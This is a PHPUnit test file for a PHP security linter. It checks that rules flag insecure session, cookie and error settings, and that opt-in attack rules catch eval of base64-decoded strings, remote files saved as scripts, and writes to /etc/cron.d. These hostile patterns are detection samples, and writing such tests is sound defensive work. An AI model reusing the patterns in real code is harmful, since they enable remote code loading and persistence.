<?php

declare(strict_types=1);

namespace Yousha\PhpSecurityLinter\Tests\Integration;

use PHPUnit\Framework\TestCase;
use Yousha\PhpSecurityLinter\Linter;
use Yousha\PhpSecurityLinter\Reporting\SarifFormatter;

final class AdditionalRulesTest extends TestCase
{
    private string $directory;
    private string $file;

    protected function setUp(): void
    {
        $this->directory = sys_get_temp_dir() . '/php-sl-rules-' . bin2hex(random_bytes(8));
        mkdir($this->directory);
        $this->file = $this->directory . '/example.php';
    }

    protected function tearDown(): void
    {
        if (is_file($this->file)) {
            unlink($this->file);
        }
        rmdir($this->directory);
    }

    /** @dataProvider ruleExamples */
    public function testReportsOnlyTheMatchingCall(string $id, string $match, string $clean): void
    {
        // Arrange
        $source = "<?php\n// " . str_replace("\n", ' ', $match) . "\n" . $match . ";\n" . $clean . ";\n";
        file_put_contents($this->file, $source);
        $linter = new Linter(includeAttack: true);

        // Act
        $scan = $linter->scan($this->directory);
        $report = json_decode((new SarifFormatter())->format($scan, $this->directory), true, 512, JSON_THROW_ON_ERROR);
        $results = array_values(array_filter($report['runs'][0]['results'], static fn(array $r): bool => $r['ruleId'] === $id));

        // Assert
        self::assertCount(1, $results);
        self::assertSame(3, $results[0]['locations'][0]['physicalLocation']['region']['startLine']);
        $descriptor = $report['runs'][0]['tool']['driver']['rules'][$results[0]['ruleIndex']];
        self::assertSame($id, $descriptor['id']);
        self::assertStringStartsWith('https://', $descriptor['helpUri']);
    }

    public static function ruleExamples(): array
    {
        return [
            'strict sessions' => ['OWASP-020', "ini_set('session.use_strict_mode', 'off')", "ini_set('session.use_strict_mode', 1)"],
            'transparent IDs' => ['OWASP-021', "\\ini_alter(\n'session.use_trans_sid', true)", "ini_set('session.use_trans_sid', false)"],
            'cookie-only IDs' => ['OWASP-022', "ini_set('session.use_only_cookies', 0)", "ini_set('session.use_only_cookies', 'On')"],
            'SameSite' => ['OWASP-023', "setcookie('id', 'v', ['secure' => false, 'samesite' => 'None'])", "setcookie('id', 'v', ['samesite' => 'None', 'secure' => true])"],
            'session cookie' => ['OWASP-023', "session_set_cookie_params(['samesite' => 'None', 'secure' => false])", "session_set_cookie_params(['samesite' => 'Lax', 'secure' => false])"],
            'host domain' => ['OWASP-024', "setcookie('__Host-id', 'v', ['domain' => 'example.test'])", "setcookie('__Host-id', 'v', ['domain' => ''])"],
            'host path' => ['OWASP-025', "setrawcookie('__Host-id', 'v', 0, '/app')", "setcookie('__Host-id', 'v', ['path' => '/'])"],
            'startup errors' => ['OWASP-026', "ini_set('display_startup_errors', '1')", "ini_set('display_startup_errors', 'Off')"],
            'HTML errors' => ['OWASP-027', "ini_set('html_errors', 'yes')", "\$object->ini_set('html_errors', 'yes')"],
            'exception arguments' => ['OWASP-028', "ini_set('zend.exception_ignore_args', '0')", "ini_set('zend.exception_ignore_args', '1')"],
            'bcrypt boundary' => ['OWASP-029', "password_hash(\$p, PASSWORD_BCRYPT, array('cost' => 9))", "password_hash(\$p, PASSWORD_BCRYPT, ['cost' => 10])"],
            'decoded literal' => ['ATTACK-001', "eval(base64_decode('Ow=='))", "base64_decode('Ow==')"],
            'remote copy' => ['ATTACK-002', "copy('https://example.invalid/sample', 'task.php')", "copy('https://example.invalid/sample', 'sample.txt')"],
            'remote write' => ['ATTACK-002', "file_put_contents('task.sh', file_get_contents('https://example.invalid/sample'))", "file_put_contents('task.sh', file_get_contents('local.txt'))"],
            'cron entry' => ['ATTACK-003', "file_put_contents('/etc/cron.d/demo', '@daily root true')", "file_put_contents('/etc/cron.d/demo', '# maintenance')"],
        ];
    }

    public function testAttackRulesRequireOptInAndRespectExclusions(): void
    {
        // Arrange
        file_put_contents($this->file, "<?php\ncopy('https://example.invalid/file', 'demo.php');");

        // Act
        $default = (new Linter())->scan($this->directory);
        $enabled = (new Linter(includeAttack: true))->scan($this->directory);
        $excluded = (new Linter(['ATTACK-002'], true))->scan($this->directory);

        // Assert
        self::assertSame(0, $default['_meta']['issue_count']);
        self::assertSame(1, $enabled['_meta']['issue_count']);
        self::assertSame(0, $excluded['_meta']['issue_count']);
    }
}
